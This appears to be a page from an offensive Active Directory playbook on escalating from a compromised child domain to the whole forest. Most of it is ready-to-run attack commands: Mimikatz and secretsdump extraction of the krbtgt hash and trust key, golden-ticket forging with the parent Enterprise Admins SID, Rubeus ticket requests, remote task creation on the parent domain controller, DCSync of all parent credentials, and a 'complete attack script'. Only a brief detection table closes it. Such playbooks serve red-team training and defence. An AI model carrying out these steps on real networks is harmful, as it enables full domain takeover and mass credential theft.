# Child to Parent Domain Attack

## Overview

In a multi-domain forest, parent-child trusts are transitive and **bidirectional** by default. SID filtering is **disabled** for intra-forest trusts, meaning SID history is honored across domains. This allows an attacker who compromises a child domain to forge a golden ticket with the Enterprise Admins SID from the parent domain — granting full access to the entire forest.

## Attack Flow

```
1. Compromise Child Domain (Domain Admin)
2. Enumerate Trusts ──► Confirm parent-child relationship
3. Extract Child krbtgt Hash
4. Get Parent Domain SID + Enterprise Admins RID (519)
5. Forge Golden Ticket with ExtraSids ──► kerberos::golden /sids:
6. Pass-the-Ticket ──► Request TGS for parent DC service
7. DCSync Parent Domain ──► Extract all credentials
```

## Step 1: Enumerate Trusts

### PowerView

```powershell
# List all domain trusts
Get-DomainTrust

# Check for parent-child trust
Get-DomainTrust | Where-Object {$_.TrustType -eq "ParentChild"}

# Verify trust direction and attributes
Get-DomainTrust | Select SourceName, TargetName, TrustType, TrustDirection, TrustAttributes

# Get the parent domain SID
Get-Domain -Domain parent.dom.com | Select DomainSID

# Get child domain SID
$childSID = (Get-Domain).DomainSID
Write-Host "Child Domain SID: $childSID"

# Get enterprise admins group SID from parent
$eaSID = (Get-DomainGroup -Identity "Enterprise Admins" -Domain parent.dom.com).objectsid
Write-Host "Enterprise Admins SID: $eaSID"

# Enterprise Admins RID is always 519
# Full SID format: S-1-5-21-PARENTDOMAIN-519
```

### netdom (Native)

```cmd
# List all trusts
netdom query trust

# Show trust details
netdom trust child.dom.com /d:parent.dom.com /verbose

# Verify trust health
netdom verify child.dom.com /d:parent.dom.com
```

### nltest (Native)

```cmd
# List domain trusts
nltest /domain_trusts

# All trusts including details
nltest /domain_trusts /all_trusts
```

### NetExec

```bash
# Trust enumeration via LDAP
nxc ldap <child-dc> -u 'user' -p 'pass' -M ad_enum -o TRUST=1

# Verify cross-domain authentication
nxc smb <parent-dc> -u 'child.dom.com\Administrator' -p 'pass'
```

## Step 2: SID Filtering / SID History

### Understanding SID Filtering

SID filtering is a security mechanism that filters out SIDs that do not belong to the authenticating domain. When enabled, SIDs from foreign domains in authentication requests are stripped.

**Key Points:**
- SID filtering is **OFF by default** for parent-child trusts (intra-forest)
- SID filtering is **ON by default** for forest trusts (inter-forest)
- Intra-forest trusts trust all SIDs from within the forest
- This is why ExtraSids attacks work within a forest

### Check SID Filtering Status

```powershell
# Check if SID filtering is enabled on trust
Get-DomainTrust | Select SourceName, TargetName, @{N='SIDFiltering';E={if($_.TrustAttributes -band 0x4){"Enabled"}else{"Disabled"}}}

# Look for TrustAttributes:
#   0x00000004 = Quarantined domain (SID filtering enabled)
#   Absence of 0x04 bit = SID filtering disabled (vulnerable)

# SID history is honored when SID filtering is disabled
Get-DomainTrust | Where-Object {$_.TargetName -eq "parent.dom.com"} | fl
```

### Enumerate Existing SID History

```powershell
# Find users with SID history populated
Get-DomainUser -LDAPFilter "(sidHistory=*)" | Select samaccountname, sidhistory, memberof

# Check ForeignSecurityPrincipal objects
Get-DomainObject -LDAPFilter "(objectClass=foreignSecurityPrincipal)" | Select cn
```

## Step 3: Extract krbtgt Hash

The krbtgt hash of the child domain is required to forge the golden ticket. This requires Domain Admin privileges on the child domain.

### Mimikatz (lsadump)

```cmd
# Extract krbtgt hash via DCSync
mimikatz # lsadump::dcsync /domain:child.dom.com /user:krbtgt

# Alternative: Extract from local SECURITY hive
mimikatz # lsadump::lsa /patch /user:krbtgt

# Alternative: Use lsadump::domain
mimikatz # lsadump::domain /user:krbtgt
```

### Impacket (secretsdump.py)

```bash
# Extract krbtgt hash from child DC
secretsdump.py child.dom.com/Administrator@child-dc -just-dc-user krbtgt
```

### Output Example

```
Object RDN           : krbtgt

** SAM ACCOUNT **
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 10/10/2023 12:00:00 AM
Object Security ID   : S-1-5-21-123456789-123456789-123456789-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: aad3b435b51404eeaad3b435b51404ee
  ntlm- 0: aad3b435b51404eeaad3b435b51404ee
  lm  - 0: 7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a
```

## Step 4: Forge Golden Ticket with ExtraSids

### Understanding ExtraSids

ExtraSids refers to adding additional domain SIDs to a Kerberos ticket's **sidHistory** field. When the KDC validates the ticket, if SID filtering is disabled, the extra SIDs are included in the user's token — granting the associated privileges.

The key is to add the **Enterprise Admins** group SID (RID 519) from the **parent domain**. This grants forest-wide admin access.

### Ticket Structure

| Field | Value |
|-------|-------|
| User | Administrator |
| Domain | child.dom.com |
| SID | S-1-5-21-CHILD-DOMAIN-SID |
| ExtraSids | S-1-5-21-PARENT-DOMAIN-SID-519 (Enterprise Admins) |
| krbtgt hash | Child domain krbtgt hash |
| /ptt | Injects directly into current session |

### Mimikatz Golden Ticket

```cmd
# Forge golden ticket with ExtraSids
mimikatz # kerberos::golden /user:Administrator /domain:child.dom.com /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519 /krbtgt:HASH /ptt

# Parameters:
#   /user      ── Username to impersonate (any name works)
#   /domain    ── Child domain (current compromised domain)
#   /sid       ── Child domain SID
#   /sids      ── Extra SIDs to append (parent Enterprise Admins: 519)
#   /krbtgt    ── Child domain krbtgt hash (NTLM)
#   /ptt       ── Pass-the-ticket: inject into current session

# Example with real SIDs:
mimikatz # kerberos::golden /user:Administrator /domain:child.dom.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ptt
```

### Verify the Ticket

```cmd
# List Kerberos tickets in current session
klist

# Verify the injected TGT
mimikatz # kerberos::list
```

## Step 5: Use the Forged Ticket

### Request Service Ticket with Rubeus

```cmd
# Request a service ticket for the parent DC using the forged TGT
# The TGT (from Mimikatz /ptt) is used to request TGS for CIFS service
Rubeus.exe asktgs /service:cifs/parentdc.dom.com /ticket:BASE64 /ptt

# Parameters:
#   /service  ── Service Principal Name on target (parent DC)
#   /ticket   ── Base64-encoded TGT (from previous step)
#   /ptt      ── Inject service ticket into current session

# Alternative: Request TGS for multiple services
Rubeus.exe asktgs /service:cifs/parentdc.dom.com,ldap/parentdc.dom.com,http/parentdc.dom.com /ticket:BASE64 /ptt
```

### Alternative: Use Mimikatz kerberos::ask

```cmd
# Request service ticket via kerberos::ask (if TGT is already injected)
mimikatz # kerberos::ask /target:cifs/parentdc.dom.com
```

### Access Parent Domain Resources

```cmd
# List shares on parent DC
dir \\parentdc.dom.com\C$

# Access SYSVOL on parent DC
dir \\parentdc.dom.com\SYSVOL

# Schedule task on parent DC
schtasks /create /s parentdc.dom.com /sc once /st 00:00 /tn "Task" /tr "cmd /c whoami" /ru SYSTEM
```

## Step 6: DCSync Parent Domain

With the forged ticket granting Enterprise Admin privileges, you can DCSync the parent domain to extract all credentials.

### Mimikatz DCSync

```cmd
# DCSync the Administrator account from parent domain
mimikatz # lsadump::dcsync /domain:parent.dom.com /user:Administrator

# DCSync krbtgt from parent domain
mimikatz # lsadump::dcsync /domain:parent.dom.com /user:krbtgt

# DCSync all users (requires multiple calls)
mimikatz # lsadump::dcsync /domain:parent.dom.com /user:Administrator
mimikatz # lsadump::dcsync /domain:parent.dom.com /user:krbtgt
mimikatz # lsadump::dcsync /domain:parent.dom.com /user:ParentAdmin
```

### Impacket DCSync (from Linux)

```bash
# On attacker machine with Linux, use secretsdump
secretsdump.py parent.dom.com/Administrator@parentdc.dom.com -just-dc
```

## Complete Attack Script

```powershell
# Child to Parent Domain Attack - Complete Workflow
# Requires: Domain Admin on child domain

# 1. Enumerate trusts
Write-Host "[*] Enumerating trusts..." -ForegroundColor Cyan
Get-DomainTrust | Format-Table

# 2. Get SIDs
$childDomain = Get-Domain
$childSID = $childDomain.DomainSID
Write-Host "[*] Child Domain SID: $childSID" -ForegroundColor Yellow

$parentDomain = $childDomain.Parent
$parentDCSID = (Get-Domain -Domain $parentDomain).DomainSID
Write-Host "[*] Parent Domain SID: $parentDCSID" -ForegroundColor Yellow

$eaSID = (Get-DomainGroup -Identity "Enterprise Admins" -Domain $parentDomain).objectsid
Write-Host "[*] Enterprise Admins SID: $eaSID" -ForegroundColor Yellow

# 3. Extract krbtgt hash (requires DA)
Write-Host "[*] Extracting krbtgt hash..." -ForegroundColor Cyan
# Launch mimikatz externally or use Invoke-Mimikatz
# mimikatz # lsadump::dcsync /domain:$childDomain /user:krbtgt

Write-Host "[*] krbtgt hash needed for golden ticket" -ForegroundColor Magenta

# 4. Build golden ticket parameters
Write-Host "[*] Golden ticket command:" -ForegroundColor Green
Write-Host "mimikatz # kerberos::golden /user:Administrator /domain:$($childDomain.Name) /sid:$childSID /sids:$eaSID /krbtgt:HASH /ptt" -ForegroundColor Green

# 5. After injection, DCSync parent
Write-Host "[*] After PTT, run:" -ForegroundColor Cyan
Write-Host "mimikatz # lsadump::dcsync /domain:$parentDomain /user:Administrator" -ForegroundColor Cyan
```

## Alternative: Trust Ticket (Inter-Realm TGT)

Instead of using the krbtgt hash (which grants persistence in the child domain), you can forge an **inter-realm TGT** using the trust key. This is stealthier as it does not require krbtgt compromise but still enables cross-domain access.

### Extract Trust Key

```cmd
# Extract trust key (requires DA on child DC)
mimikatz # lsadump::trust /patch

# Example output:
# [Out] child.dom.com -> parent.dom.com
# * 3c e2 a5 6b 3d 8a 9c 2d 1e 4b 7f 0a d6 5e 8f 1c

# Extract trust auth info
mimikatz # lsadump::lsa /patch /id:1
```

### Forge Inter-Realm TGT

```cmd
# Forge inter-realm TGT with trust key instead of krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:child.dom.com /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519 /rc4:TRUST_KEY /target:parent.dom.com /service:krbtgt /ptt
```

## Detection

| Activity | Event ID | Source | Notes |
|----------|----------|--------|-------|
| Kerberos ticket with extra SIDs | 4768 | Security (DC) | Ticket options flags may indicate forged ticket |
| TGS request with elevated privileges | 4769 | Security (DC) | Service ticket for sensitive service |
| Cross-domain TGS request | 4769 | Security (DC) | Target domain different from account domain |
| DCSync  | 4662 | Security (DC) | DS-Replication-Get-Changes access |
| SID history query | 4662 | Security (DC) | LDAP filter for sidHistory |

## References

- [Kerberos Golden Ticket (06_Kerberos_Attacks/03_Golden_Ticket.md)](../06_Kerberos_Attacks/03_Golden_Ticket.md)
- [Trust Enumeration (01_Enumeration/04_Trust_Enumeration.md)](../01_Enumeration/04_Trust_Enumeration.md)
- [DCSync (03_Credential_Access/02_DCSync.md)](../03_Credential_Access/02_DCSync.md)
- [Mimikatz Reference (09_Tools_Reference/04_Mimikatz.md)](../09_Tools_Reference/04_Mimikatz.md)
